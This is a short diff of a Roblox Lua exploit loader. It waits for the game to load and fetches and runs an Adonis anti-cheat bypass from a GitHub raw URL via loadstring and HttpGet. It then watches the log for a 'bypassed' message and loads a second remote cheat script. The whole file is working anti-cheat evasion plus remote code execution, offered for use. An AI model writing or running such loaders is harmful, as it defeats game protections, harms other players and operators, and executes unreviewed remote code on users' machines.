@@ -1,1 +1,16 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua'))()
+repeat task.wait() until game:IsLoaded()
+local s = false
+local c = game:GetService("LogService").MessageOut:Connect(function(m)
+    if m:lower():find("adonis") and m:lower():find("bypassed") then s = true end
+end)
+pcall(function()
+    local l = game:GetService("Players").LocalPlayer
+    local m = l:WaitForChild("PlayerGui"):WaitForChild("MainMenu", 15)
+    if m then while not m.Visible and m.Parent do task.wait(0.05) end end
+    task.wait(0.1)
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Pixeluted/adoniscries/main/Source.lua'))()
+end)
+repeat task.wait(0.2) until s
+if c then c:Disconnect() end
+task.wait(0.5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/areyoutuffmango67/Torinax/refs/heads/main/Torianx%20Bridger%20Western"))()
